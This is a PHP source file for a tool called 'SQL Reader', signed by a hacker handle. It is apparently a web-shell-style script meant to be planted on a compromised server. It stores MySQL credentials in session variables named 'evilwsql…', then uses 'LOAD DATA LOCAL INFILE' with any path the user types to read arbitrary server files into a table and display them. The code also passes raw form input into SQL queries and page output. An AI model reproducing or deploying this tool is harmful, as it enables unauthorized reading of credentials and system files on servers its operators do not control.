<?php
session_start();
echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" >
<head>
       <title>SQLReader - '.$_SERVER['SERVER_ADDR'].'</title>
       <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
       <style type="text/css">
	   body {
	   background-color:black;
	   color:rgb(200,200,200);
	   font-family:Arial,Verdana,Tahoma;
	   font-size:12px;
	   font-weight:bold;
	   scrollbar-face-color:rgb(10,10,10);
	   scrollbar-highlight-color:rgb(200,200,200);
	   scrollbar-3dlight-color:rgb(10,10,10);
	   scrollbar-darkshadow-color:black;
	   scrollbar-shadow-color:rgb(50,50,50);
	   scrollbar-arrow-color:rgb(200,200,200);
	   }
	   textarea {
	   border:1px solid rgb(200,200,200);
	   background-color:black;
	   color:rgb(200,200,200);
	   }
	   input {
	   background-color:black;
	   color:rgb(200,200,200);
	   border:1px solid rgb(200,200,200);
	   }
	   a {
	   color:rgb(150,150,150);
	   text-decoration:none;
	   }
	   a:hover {
	   color:rgb(255,255,255);
	   text-decoration:none;
	   }
	   .dir {
	   color:white;
	   }
	   .title {
	   font-size:17px;
	   color:white;
	   }
	   </style>
</head>
<body>
<center><span class="title">SQL Reader <br> By ZaIdOoHxHaCkEr</span></center>';
if ($_GET['dec'] == 1) {  
 session_unset();  
 session_destroy();
$_SESSION = null; 
echo '<meta http-equiv=\"refresh\" content=\"0;URL=..'.$_SERVER["PHP_SELF"].'">';
 }
if (isset($_POST['host']) AND isset($_POST['login']) AND isset($_POST['password'])) {
$_SESSION['evilwsqlhost'] = $_POST['host'];
$_SESSION['evilwsqllogin'] = $_POST['login'];
$_SESSION['evilwsqlpassword'] = $_POST['password'];
$_SESSION['evilwsqldatabase'] = $_POST['database'];
}
else {
} 
if (isset($_SESSION['evilwsqlhost']) AND isset($_SESSION['evilwsqllogin']) AND isset($_SESSION['evilwsqlpassword']) AND isset($_SESSION['evilwsqldatabase'])) { 
@mysql_connect($_SESSION['evilwsqlhost'],$_SESSION['evilwsqllogin'],$_SESSION['evilwsqlpassword']) or session_destroy() AND die('Cannot connect to SQL !<meta http-equiv="refresh" content="2;URL=..'.$_SERVER["PHP_SELF"].'">');
@mysql_select_db($_SESSION['evilwsqldatabase']) or session_destroy() AND die('Cannot connect to SQL !<meta http-equiv="refresh" content="2;URL=..'.$_SERVER["PHP_SELF"].'">');
function mysql_table_exists($table){
$query = "SELECT COUNT(*) FROM $table";
$result = mysql_query($query);
$num_rows = @mysql_num_rows($result);
if($num_rows)
return TRUE;
else
return FALSE;
}
if (isset($_POST['filetoread'])) {
if (mysql_table_exists('sqlr10')) {
mysql_query('DROP TABLE sqlr10 CASCADE CONSTRAINT');
}
mysql_query('CREATE TABLE sqlr10 (info varchar(255))');
$file = $_POST['filetoread'];
mysql_query('DELETE FROM sqlr10');
mysql_query("LOAD DATA LOCAL INFILE '$file' INTO TABLE sqlr10");
$query = mysql_query('SELECT * FROM sqlr10');
echo '<textarea style="width:600px;height:400px;">';
while ($donnes = mysql_fetch_array($query)) {
print_r($donnes['info']."\n");
}
echo '</textarea>';
}
echo '<br><br>
      <form method="post" action="'.$_SERVER["PHP_SELF"].'">
	  <table><tr><td>File : <input style="width:550px;" type="text" name="filetoread" value="'.$_POST['filetoread'].'"></td><td><input type="submit" value="Read"></td></tr></table>';
echo '<table><tr><td>Dir : </td><td><span class="dir">'.getcwd().'</span></td></tr>';
echo '</table><br><br><br><a href="'.$_SERVER["PHP_SELF"].'?dec=1">Log Out</a>';
	  }
else {	  
echo '<br><br>
      <form method="post" action="'.$_SERVER["PHP_SELF"].'">
      <table><tr><td>Host : </td><td><input type="text" name="host" value="localhost"></td></tr>
	  <tr><td>Login : </td><td><input type="text" name="login"></td></tr>
	  <tr><td>Password : </td><td><input type="password" name="password"></td></tr>
	  <tr><td>Database : </td><td><input type="text" name="database"></td></tr>
	  <tr><td></td><td><input type="submit" value="connect"></td></tr></table></form>';
	  
	  }
?>